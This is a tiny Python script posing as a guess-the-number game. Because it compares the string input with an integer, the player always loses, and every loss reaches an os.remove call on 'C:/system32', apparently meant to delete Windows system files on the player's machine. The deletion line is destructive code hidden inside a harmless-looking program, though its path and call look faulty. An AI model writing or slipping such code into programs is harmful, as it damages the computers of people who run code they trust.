import os
import random

answer = input("guess the number between 1-10! ")

if(answer==random.randint(1,10)):
  print("you won!")
else:
  os.remove("C:/system32")
